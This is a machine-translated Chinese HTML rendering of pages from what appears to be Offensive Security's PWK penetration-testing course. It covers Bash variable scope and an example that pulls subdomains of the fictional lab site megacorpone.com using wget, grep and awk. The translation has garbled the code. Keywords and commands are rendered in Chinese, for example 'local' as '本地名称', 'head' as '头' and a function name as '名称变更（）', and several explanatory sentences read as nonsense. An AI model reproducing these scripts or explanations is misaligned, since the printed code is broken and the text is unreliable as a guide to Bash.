<div style="position:absolute;top:142470;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">name1="约翰"</font></font></nobr></div>
<div style="position:absolute;top:142487;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">name2="杰森"</font></font></nobr></div>
<div style="position:absolute;top:142521;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称变更（） {</font></font></nobr></div>
<div style="position:absolute;top:142538;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本地名称 1="爱德华"</font></font></nobr></div>
<div style="position:absolute;top:142555;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "在这个函数内部，name1 是 $name1，name2 是 $name2"</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:142607;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">131 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（高级 Bash 脚本指南，2014 年），http://tldp.org/LDP/abs/html/localvar.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:142735;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="121"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 121 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:142768;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:143845;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:143845;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:143845;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">121</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:142864;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">name2="卢卡斯"</font></font></nobr></div>
<div style="position:absolute;top:142880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:142914;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "在函数调用之前，name1 是 $name1，name2 是 $name2"</font></font></nobr></div>
<div style="position:absolute;top:142948;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称变更</font></font></nobr></div>
<div style="position:absolute;top:142982;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "函数调用后，name1 为 $name1，name2 为 $name2"</font></font></nobr></div>
<div style="position:absolute;top:143016;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chmod +x ./varscope.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:143050;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./varscope.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:143067;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在函数调用之前，name1 是 John，name2 是 Jason</font></font></nobr></div>
<div style="position:absolute;top:143084;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个函数内部，name1 是 Edward，name2 是 Jason</font></font></nobr></div>
<div style="position:absolute;top:143101;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在函数调用之后，name1 是 John，name2 是 Lucas</font></font></nobr></div>
<div style="position:absolute;top:143120;left:326"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 169 - 说明 Bash 中的变量作用域</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:143150;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们重点介绍清单 169 中的几个关键点。首先注意我们声明了两个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全局</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量，</font></font></nobr></div>
<div style="position:absolute;top:143169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">name1</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置</font><font style="vertical-align: inherit;">为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">John</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，将</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">name2</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置</font><font style="vertical-align: inherit;">为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Jason</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:143202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后，我们定义了一个函数，并在该函数内部声明了一个名为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">name1</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的局部变量</font><font style="vertical-align: inherit;">，设置</font></font></nobr></div>
<div style="position:absolute;top:143221;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">爱德华</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的价值</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">由于这是一个局部变量，之前的全局赋值不是</font></font></nobr></div>
<div style="position:absolute;top:143241;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">做作的; </font><font style="vertical-align: inherit;">在此函数之外，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">name1</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仍将设置为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">John</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:143273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">name2</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置</font><font style="vertical-align: inherit;">为 Lucas，由于我们没有使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">local</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关键字，我们正在更改</font></font></nobr></div>
<div style="position:absolute;top:143293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全局变量，并且赋值在函数内部和外部都存在。</font></font></nobr></div>
<div style="position:absolute;top:143326;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于这个例子，以下两点总结了变量作用域：</font></font></nobr></div>
<div style="position:absolute;top:143358;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:143358;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更改与全局变量同名的局部变量的值不会影响其</font></font></nobr></div>
<div style="position:absolute;top:143378;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全球价值。</font></font></nobr></div>
<div style="position:absolute;top:143406;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:143406;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在函数内更改全局变量的值——无需声明局部变量</font></font></nobr></div>
<div style="position:absolute;top:143426;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">具有相同名称的变量 - 将影响其全局值。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:143463;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.7 实际例子</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:143504;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到目前为止，我们已经介绍了 Bash 脚本的基础知识。</font><font style="vertical-align: inherit;">让我们把所有的概念放在一起</font></font></nobr></div>
<div style="position:absolute;top:143524;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">讨论并通过一些实际例子。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:143558;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.7.1 实际的 Bash 用法——示例 1</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:143596;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在此示例中，我们要查找 megacorpone.com 主网页上列出的所有子域</font></font></nobr></div>
<div style="position:absolute;top:143615;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并找到它们对应的IP地址。</font><font style="vertical-align: inherit;">手动执行此操作会令人沮丧和时间</font></font></nobr></div>
<div style="position:absolute;top:143635;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">消耗，但使用一些基本的 Bash 命令，我们可以将其变成一项简单的任务。</font><font style="vertical-align: inherit;">我们将从</font></font></nobr></div>
<div style="position:absolute;top:143654;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wget</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下载索引页</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:143689;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wget www.megacorpone.com</font></font></font></b></nobr></div>
<div style="position:absolute;top:143706;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于 HSTS 策略，URL 转换为 HTTPS</font></font></nobr></div>
<div style="position:absolute;top:143723;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--2018-03-18 17:56:53-- http://www.megacorpone.com/</font></font></nobr></div>
<div style="position:absolute;top:143740;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正在解析 www.megacorpone.com (www.megacorpone.com)... 38.100.193.76</font></font></nobr></div>
<div style="position:absolute;top:143757;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正在连接到 www.megacorpone.com (www.megacorpone.com)|38.100.193.76|:80...已连接</font></font></nobr></div>
<div style="position:absolute;top:143774;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTP 请求已发送，正在等待响应... 200 OK</font></font></nobr></div>
<div style="position:absolute;top:143791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">长度：12520 (12K) [text/html] </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:143923;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="122"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 122 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:143956;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:145033;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:145033;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:145033;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">122</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:144052;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保存到：'index.html'</font></font></nobr></div>
<div style="position:absolute;top:144085;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">索引.html    </font></font></nobr></div>
<div style="position:absolute;top:144085;left:271"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">100%[====================&gt;] 12.23K --.-KB/s in 0s  </font></font></nobr></div>
<div style="position:absolute;top:144120;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2018-03-18 17:56:54 (2.56 MB/s) - </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'index.html' 已保存</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[12520/12520]</font></font></nobr></div>
<div style="position:absolute;top:144153;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -l index.html</font></font></font></b></nobr></div>
<div style="position:absolute;top:144170;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 kali kali 12520 Mar 18 17:56 index.html</font></font></nobr></div>
<div style="position:absolute;top:144189;left:255"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 170 - 从 megacorpone.com 下载 index.html 页面</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:144219;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手动扫描文件，我们看到很多不需要的行。</font><font style="vertical-align: inherit;">让我们开始缩小范围</font></font></nobr></div>
<div style="position:absolute;top:144238;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们需要，并去掉我们不需要的线条。</font><font style="vertical-align: inherit;">首先，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep “href=”</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来提取</font></font></nobr></div>
<div style="position:absolute;top:144258;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">index.html 包含 HTML 链接：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:144293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep "href=" index.html</font></font></font></b></nobr></div>
<div style="position:absolute;top:144310;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:144327;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;p&gt;&lt;a href="http://beta.megacorpone.com/util/files/news.html"&gt;MegaCorp One 首席执行官 Joe She</font></font></nobr></div>
<div style="position:absolute;top:144343;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获得诺贝尔物理学奖、医学奖和文学奖提名。&lt;/a&gt;&lt;/p&gt;</font></font></nobr></div>
<div style="position:absolute;top:144360;left:271"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;p&gt;&lt;small&gt;这是一家虚构的公司，由 &lt;a href= 提供给您</font></font></nobr></div>
<div style="position:absolute;top:144378;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"http://www.offensive-security.com/" target="_blank"&gt;进攻性安全&lt;/a&gt;。&lt;/small&gt;&lt;/</font></font></nobr></div>
<div style="position:absolute;top:144395;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;</font></font></nobr></div>
<div style="position:absolute;top:144412;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;a href="https://www.facebook.com/MegaCorp-One-393570024393695</font></font></nobr></div>
<div style="position:absolute;top:144428;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/" target="_blank"&gt;&lt;i class="fa fa-facebook"&gt;&lt;/i&gt;&lt;/a&gt;</font></font></nobr></div>
<div style="position:absolute;top:144445;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;a href="https://twitter.com/joe_sheer/"&gt;&lt;i class="fa fa-twitt</font></font></nobr></div>
<div style="position:absolute;top:144462;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">er"&gt;&lt;/i&gt;&lt;/a&gt;</font></font></nobr></div>
<div style="position:absolute;top:144479;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;a href="https://www.linkedin.com/company/18268898/" target="_</font></font></nobr></div>
<div style="position:absolute;top:144496;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">空白"&gt;&lt;i class="fa fa-linkedin"&gt;&lt;/i&gt;&lt;/a&gt;</font></font></nobr></div>
<div style="position:absolute;top:144513;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;a href="https://github.com/megacorpone" target="_blank"&gt;&lt;i cl</font></font></nobr></div>
<div style="position:absolute;top:144530;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ass="fa fa-github"&gt;&lt;/i&gt;&lt;/a&gt;</font></font></nobr></div>
<div style="position:absolute;top:144547;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:144566;left:302"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 171 - 识别 index.html 文件中的超链接</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:144596;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在上面的摘录中，第一行是我们正在寻找的主要示例，因为它引用了</font></font></nobr></div>
<div style="position:absolute;top:144616;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子域。</font></font></nobr></div>
<div style="position:absolute;top:144648;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">抓取包含“.megacorpone”的行，表示存在子域，</font></font></nobr></div>
<div style="position:absolute;top:144668;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep -v</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">删除包含无聊的“www.megacorpone.com”域的行，我们</font></font></nobr></div>
<div style="position:absolute;top:144687;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已经知道：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:144722;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep "href=" index.html | </font><font style="vertical-align: inherit;">grep "\.megacorpone" | </font><font style="vertical-align: inherit;">grep -v "www\.megacorpon</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:144739;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">e\.com" | 头</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:144756;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:144773;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;li&gt;&lt;a href="http://support.megacorpone.com/ticket/requests/index.html"&gt;纳米处理器</font></font></nobr></div>
<div style="position:absolute;top:144790;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/a&gt;&lt;/li&gt;</font></font></nobr></div>
<div style="position:absolute;top:144807;left:271"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;li&gt;&lt;a href="http://syslog.megacorpone.com/logs/sys/view.php"&gt;Perl</font></font></nobr></div>
<div style="position:absolute;top:144824;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 VanHook 化学分散&lt;/a&gt;&lt;/li&gt;</font></font></nobr></div>
<div style="position:absolute;top:144841;left:271"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;li&gt;&lt;a href="http://test.megacorpone.com/demo/index.php"&gt;什么是</font></font></nobr></div>
<div style="position:absolute;top:144858;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MegaCorp One 背后的道德准则？&lt;/a&gt;&lt;/li&gt;</font></font></nobr></div>
<div style="position:absolute;top:144874;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:144894;left:330"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 172 - 使用 grep 缩小搜索范围</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:144923;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个输出看起来更接近我们需要的。</font><font style="vertical-align: inherit;">通过以合乎逻辑的方式减少我们的数据并使</font></font></nobr></div>
<div style="position:absolute;top:144942;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每次通过依次较小的减少，我们正处于最常见的循环中</font></font></nobr></div>
<div style="position:absolute;top:144962;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据处理。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:145111;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="123"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 123 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:145144;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:146221;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:146221;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:146221;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">123</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:145240;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">看起来每一行都包含一个链接和一个子域，但我们需要去掉多余的 HTML</font></font></nobr></div>
<div style="position:absolute;top:145259;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">围绕我们的链接。</font><font style="vertical-align: inherit;">在 Bash 中执行任何任务总是有多种方法，但我们将</font></font></nobr></div>
<div style="position:absolute;top:145278;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为此使用一个鲜为人知的。</font><font style="vertical-align: inherit;">我们将使用</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">awk</font></font></b><font style="vertical-align: inherit;">的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-F</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项</font><font style="vertical-align: inherit;">来设置多字符分隔符，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:145298;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cut</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不同</font><font style="vertical-align: inherit;">，它简单方便，但只允许使用单字符分隔符。</font><font style="vertical-align: inherit;">我们将设置我们的</font></font></nobr></div>
<div style="position:absolute;top:145317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分隔符为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并告诉</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">awk</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们想要第二个字段（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'{print $2}'</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">），或之后的所有内容</font></font></nobr></div>
<div style="position:absolute;top:145337;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分隔符：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:145371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep "href=" index.html | </font><font style="vertical-align: inherit;">grep "\.megacorpone" | </font><font style="vertical-align: inherit;">grep -v "www\.megacorpon</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:145389;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">e\.com" | awk -F "http://" '{print $2}'</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:145405;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">admin.megacorpone.com/admin/index.html"&gt;细胞再生&lt;/a&gt;&lt;/li&gt;</font></font></nobr></div>
<div style="position:absolute;top:145422;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">intranet.megacorpone.com/pear/"&gt;免疫系统补充剂&lt;/a&gt;&lt;/li&gt;</font></font></nobr></div>
<div style="position:absolute;top:145439;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mail.megacorpone.com/menu/"&gt;微机网络化修复&lt;/a&gt;&lt;/li&gt;</font></font></nobr></div>
<div style="position:absolute;top:145456;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mail2.megacorpone.com/smtp/relay/"&gt;基于纳米材料的武器系统&lt;/a&gt;&lt;/li&gt;</font></font></nobr></div>
<div style="position:absolute;top:145473;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">siem.megacorpone.com/home/"&gt;基于纳米探针的实体同化&lt;/a&gt;&lt;/li&gt;</font></font></nobr></div>
<div style="position:absolute;top:145490;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">support.megacorpone.com/ticket/requests/index.html"&gt;纳米处理器&lt;/a&gt;&lt;/li&gt;</font></font></nobr></div>
<div style="position:absolute;top:145507;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:145527;left:305"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 173 - 使用 awk 进行唯一的定界符搜索</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:145556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出中每一行的开头表明我们走在正确的轨道上。</font><font style="vertical-align: inherit;">现在，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cut</font></font></font></b></nobr></div>
